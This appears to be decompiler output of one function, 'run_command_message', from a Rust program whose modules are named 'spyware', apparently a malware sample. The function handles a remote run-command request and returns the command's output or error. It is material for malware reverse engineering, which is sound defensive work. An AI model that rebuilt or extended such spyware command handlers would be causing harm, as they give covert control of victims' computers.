long long spyware::actions::commands::run_command_message(struct_0 *a0, unsigned long long a1[3])
{
    unsigned long long v0;  // [bp-0xc8]
    unsigned long long v1;  // [bp-0xc0]
    char *v2;  // [bp-0xb8], Other Possible Types: unsigned long long
    unsigned long long v3;  // [bp-0xb0]
    unsigned long long v4;  // [bp-0xa8]
    char *v5;  // [bp-0x98], Other Possible Types: unsigned long long
    unsigned long long v6;  // [bp-0x90]
    unsigned long v7;  // [bp-0x88]
    unsigned int v8;  // [bp-0x84]
    unsigned long long v9;  // [bp-0x80]
    char *v10;  // [bp-0x78]
    unsigned long long v11;  // [bp-0x70]
    void* v12;  // [bp-0x68]
    char *v13;  // [bp-0x58]
    unsigned long long v14;  // [bp-0x50]
    char *v15;  // [bp-0x48]
    unsigned long long v16[3];  // [bp-0x38]
    unsigned long long v17;  // [bp-0x30]
    char v18;  // [bp-0x28]
    unsigned long v20;  // r15

    if (::0x459540::core::sync::atomic::atomic_load() >= 4)
    {
        v16[0] = a1;
        v13 = &v16;
        v14 = <&T as core::fmt::Display>::fmt;
        v7 = &g_4ba0b8;
        v9 = 2;
        v12 = 0;
        v10 = &v13;
        v11 = 1;
        v0 = "spyware::actions::commands";
        v1 = 26;
        v2 = "spyware::actions::commands";
        v3 = 26;
        v4 = log::__private_api::loc(&g_4ba0f8);
        log::__private_api::log(&(char)v7, 4, &v0);
    }
    spyware::actions::commands::run_command(&v16, a1[1], a1[2]);
    if ((char)(((0 ^ v16) & (0 ^ -(v16))) >> 63))
    {
        v5 = v17;
        if (::0x459540::core::sync::atomic::atomic_load())
        {
            v13 = &v5;
            v14 = <std::io::error::Error as core::fmt::Display>::fmt;
            v7 = &g_4ba0e8;
            v9 = 1;
            v12 = 0;
            v10 = &v13;
            v11 = 1;
            v0 = "spyware::actions::commands";
            v1 = 26;
            v2 = "spyware::actions::commands";
            v3 = 26;
            v4 = log::__private_api::loc(&g_4ba128);
            log::__private_api::log(&(char)v7, 1, &v0);
        }
        (char)v7.to_vec();
        v2 = v10;
        memcpy(&v0, &(char)v7, 16);
        ::0x459170::std::io::error::repr_bitpacked::decode_repr(&(char)v7, v5);
        v20 = (char)v7;
        (char)v7.spec_to_string(&v5);
        a0->field_28 = v10;
        *((int128_t *)&a0->field_18) = *((int128_t *)&v7);
        a0->field_10 = v2;
        a0->field_0 = *((int128_t *)&v0);
        a0->field_30 = -(0 < (v20 & 255)) | v8;
        ::0x4593c0::core::ptr::drop_in_place<std::io::error::Error>(v5);
    }
    else
    {
        v15 = *((long long *)&v18);
        memcpy(&v13, &v16, 16);
        if (::0x459540::core::sync::atomic::atomic_load() >= 4)
        {
            v5 = &v13;
            v6 = <alloc::string::String as core::fmt::Display>::fmt;
            v7 = &g_4ba0d8;
            v9 = 1;
            v12 = 0;
            v10 = &v5;
            v11 = 1;
            v0 = "spyware::actions::commands";
            v1 = 26;
            v2 = "spyware::actions::commands";
            v3 = 26;
            v4 = log::__private_api::loc(&g_4ba110);
            log::__private_api::log(&(char)v7, 4, &v0);
        }
        a0->field_10 = v15;
        a0->field_0 = *((int128_t *)&v13);
        *((unsigned long long *)&a0->field_18) = 0x8000000000000000;
    }
    core::ptr::drop_in_place<spyware::communication::messages::RunCommandRequest>(a1);
    return a0;
}
